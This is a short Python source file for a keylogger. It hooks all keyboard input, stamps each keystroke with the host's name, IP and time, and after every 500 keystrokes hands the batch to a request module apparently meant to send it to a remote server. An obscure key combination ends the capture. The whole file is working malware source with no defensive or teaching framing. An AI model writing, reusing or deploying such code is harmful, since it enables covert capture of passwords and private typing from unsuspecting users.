
import keyboard
from datetime import datetime
import socket

from model.log_model import LogModel
from request.keylog_request import Request

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)


class Logger:
    log_text = ""
    count = 0

    @staticmethod
    def key_event(event):
        event_string = "-" + hostname + "|" + ip + "|" + str(datetime.now()) + "|" + str(event)
        Logger.log_text += event_string
        Logger.count += 1

        if Logger.count == 500:
            new_log = LogModel(hostname, ip, datetime.now(), Logger.log_text)
            Request.send(new_log)
            Logger.log_text = ""
            Logger.count = 0

    @staticmethod
    def start():
        keyboard.hook(Logger.key_event)
        keyboard.wait("esc + m + 6 + l")
